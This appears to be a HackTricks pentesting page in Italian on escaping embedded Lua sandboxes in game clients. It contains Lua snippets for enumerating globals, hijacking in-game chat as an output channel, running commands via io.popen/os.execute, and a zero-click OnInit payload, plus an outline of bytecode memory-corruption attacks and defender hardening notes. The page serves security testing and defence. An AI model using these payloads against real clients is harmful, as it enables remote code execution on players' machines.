# Bypass dei sandbox Lua (VM embedded, client di gioco)

{{#include ../../../banners/hacktricks-training.md}}

Questa pagina raccoglie tecniche pratiche per enumerare e uscire dai "sandbox" Lua embedded nelle applicazioni (in particolare client di gioco, plugin o scripting engine in-app). Molti engine espongono un ambiente Lua limitato, ma lasciano raggiungibili globali potenti che consentono l'esecuzione arbitraria di comandi o persino la corruzione della memoria nativa quando i bytecode loader sono esposti.

Idee chiave:
- Tratta la VM come un ambiente sconosciuto: enumera _G e scopri quali primitive pericolose sono raggiungibili.
- Quando stdout/print è bloccato, usa impropriamente qualsiasi canale UI/IPC in-VM come sink di output per osservare i risultati.
- Se io/os è esposto, spesso hai l'esecuzione diretta di comandi (io.popen, os.execute).
- Se load/loadstring/loadfile è esposto, l'esecuzione di bytecode Lua creato ad hoc può compromettere la memory safety in alcune versioni (i verifier ≤5.1 possono essere bypassati; il verifier è stato rimosso nella 5.2), consentendo exploitation avanzata.

## Enumerare l'ambiente sandboxed

- Esegui il dump dell'ambiente globale per inventariare tabelle/funzioni raggiungibili:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se print() non è disponibile, riutilizza i canali in-VM. Esempio tratto dalla VM di uno script per l'arredamento di un MMO, in cui l'output della chat funziona solo dopo una chiamata audio; quanto segue crea una funzione di output affidabile:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizza questo pattern per il tuo target: qualsiasi textbox, toast, logger o callback UI che accetti stringhe può fungere da stdout per la ricognizione.

## Esecuzione diretta dei comandi se io/os è esposto

Se la sandbox espone ancora le librerie standard io o os, probabilmente hai un'immediata esecuzione dei comandi:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Note:

- L'esecuzione avviene all'interno del processo client; molti livelli anti-cheat/antidebug che bloccano i debugger esterni non impediranno la creazione di processi nella VM.
- Controlla anche: package.loadlib (caricamento arbitrario di DLL/.so), require con moduli nativi, ffi di LuaJIT (se presente) e la libreria debug (può aumentare i privilegi all'interno della VM).

## Trigger zero-click tramite callback auto-run

Se l'applicazione host invia script ai client e la VM espone hook auto-run (ad es. OnInit/OnLoad/OnEnter), inserisci lì il tuo payload per ottenere un compromesso drive-by non appena lo script viene caricato:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualsiasi callback equivalente (OnLoad, OnEnter, ecc.) generalizza questa tecnica quando gli script vengono trasmessi ed eseguiti automaticamente sul client.

## Primitive pericolose da cercare durante la recon

Durante l'enumerazione di _G, cercare in particolare:
- io, os: io.popen, os.execute, I/O su file, accesso all'ambiente.
- load, loadstring, loadfile, dofile: eseguono source o bytecode; supportano il caricamento di bytecode non attendibile.
- package, package.loadlib, require: caricamento di librerie dinamiche e superficie dei moduli.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo e hooks.
- Solo LuaJIT: ffi.cdef, ffi.load per chiamare direttamente codice nativo.

Esempi di utilizzo minimi (se raggiungibili):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation opzionale: abuso dei bytecode loaders Lua

Quando load/loadstring/loadfile sono raggiungibili ma io/os sono limitati, l'esecuzione di Lua bytecode appositamente creato può portare a primitive di memory disclosure e corruzione della memoria. Fatti chiave:
- Lua ≤ 5.1 includeva un bytecode verifier con bypass noti.<sup>[[4]](#references)</sup>
- Lua 5.2 ha rimosso completamente il verifier (posizione ufficiale: le applicazioni dovrebbero semplicemente rifiutare i chunk precompilati), ampliando la attack surface se il caricamento di bytecode non è vietato.<sup>[[2]](#references)[[3]](#references)</sup>
- I workflow seguono tipicamente questo schema: leak di puntatori tramite l'output in-VM, creazione di bytecode per generare type confusion (ad esempio attorno a FORLOOP o ad altri opcode), quindi pivot verso arbitrary read/write o l'esecuzione di native code.<sup>[[2]](#references)[[4]](#references)</sup>

Questo percorso è specifico dell'engine/versione e richiede RE. Consultare i riferimenti per analisi approfondite, exploitation primitives ed esempi di gadgetry nei giochi.

## Note su detection e hardening (per i defender)

- Server side: rifiutare o riscrivere gli script degli utenti; consentire tramite allowlist solo le API sicure; rimuovere o associare a valori vuoti io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: eseguire Lua con un _ENV minimale, vietare il caricamento di bytecode, reintrodurre un bytecode verifier rigoroso o signature checks e bloccare la creazione di processi dal client process.
- Telemetria: generare un alert sulla creazione di processi child da parte di gameclient poco dopo il caricamento dello script; correlare con gli eventi UI/chat/script.

## Riferimenti

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
